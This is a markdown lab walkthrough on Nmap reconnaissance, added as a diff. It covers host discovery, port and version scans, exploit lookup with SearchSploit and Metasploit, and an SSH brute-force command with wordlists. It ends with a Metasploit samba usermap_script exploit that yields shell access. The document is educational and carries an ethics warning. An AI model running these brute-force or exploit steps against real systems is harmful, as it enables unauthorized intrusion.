@@ -1,0 +1,151 @@
+# 🛡️ Ethical Reminder
+
+This lab is for educational purposes only. Always scan with permission. Unauthorized scanning or exploitation of systems is illegal and unethical.
+
+---
+
+# 🧪 Nmap Recon Lab — Tutorial Walkthrough
+
+This lab documents a full Nmap-based reconnaissance workflow inspired by Loi Liang Yang’s tutorial. It covers basic scans, service enumeration, exploit research, brute force attempts, and report generation.
+
+---
+
+## 🔍 What Is Nmap?
+
+**Nmap** (short for Network Mapper) is a free, open-source tool used for:
+- Network discovery
+- Security auditing
+- Host and service enumeration
+
+**How It Works:**  
+Nmap sends specially crafted packets to target hosts and analyzes the responses to gather information about open ports, running services, and operating systems.
+
+---
+
+## 🧭 Example Workflow: Scanning Devices on Your Network
+
+### 🔹 Step 1: Find Your IP Address
+```bash
+ip addr
+
+This command lists your IP address and network interfaces. Use it to identify your local subnet.
+
+🔹 Step 2: Discover Devices on the Network
+nmap -sn <target subnet>
+
+
+- -sn: Ping scan only (no port scan)
+- This identifies all active IPs on your network.
+
+🔹 Step 3: Run a Basic Port Scan
+nmap <target IP>
+
+
+This default scan shows open TCP ports and basic service info.
+🧠 Think of it like checking which doors and windows are unlocked on a house.
+
+
+🔹 Step 4: Advanced Service Version Scan
+nmap -sV <target IP>
+
+
+- -sV: Detects service versions
+- Helps identify specific software running on each port
+Useful for researching known vulnerabilities tied to specific versions.
+
+
+🧨 Step 5: Exploit Research Options
+Option 1: SearchSploit
+searchsploit openssh <version>
+
+
+- Finds known exploits for a given service and version
+- Example version: OpenSSH 5.3p1
+
+Option 2: Metasploit
+sudo msfconsole
+
+
+Inside Metasploit:
+search openssh
+
+
+- Lists available modules
+- Example: auxiliary/scanner/ssh
+
+Option 3: Brute Force SSH with Nmap
+nmap -p 22 --script ssh-brute \
+--script-args userdb=/usr/share/wordlists/commonusernames.txt,\
+passdb=/usr/share/wordlists/commonpasswords.txt,\
+ssh-brute.timeout=4s <target IP>
+
+
+- Attempts login using common username/password combos
+- Targets port 22 (SSH)
+
+📄 Step 6: Generate XML Report
+nmap -T5 -A -v <target IP> -oX network-map.xml
+
+
+- -T5: Max speed/aggression
+- -A: OS detection + default scripts
+- -v: Verbose output
+- -oX: XML output
+To view:
+firefox network-map.xml
+
+
+
+🌐 Step 7: Convert XML to HTML
+xsltproc ./network-map.xml -o network-map.html
+firefox network-map.html
+
+
+This creates a readable HTML report of your scan results.
+
+🛡️ Bonus: Vulnerability Script Scans
+Common Web Vulnerabilities
+nmap -p 80 --script vuln <target IP>
+
+
+SMB Enumeration
+nmap -p139,445 --script smb-os-discovery,smb-enum-shares,smb-enum-users <target IP>
+
+
+SMB Version Detection
+nmap -p139,445 -sV <target IP>
+
+
+
+🎯 Exploit with Metasploit
+Search for SMB-related exploits:
+search smb      # Port 139
+search samba    # Port 445
+
+
+Use a module:
+use exploit/multi/samba/usermap_script
+
+
+Set options:
+show options
+set RHOST <target IP>
+exploit
+
+
+Once successful, test shell access:
+pwd
+whoami
+ls
+
+
+✅ You now have shell access to the target system.
+
+
+✅ Conclusion
+- Discovered active hosts on the network
+- Identified open ports and service versions
+- Researched exploits using SearchSploit and Metasploit
+- Ran brute force and vulnerability scans
+- Generated and converted scan reports
+- Successfully gained shell access to a target device
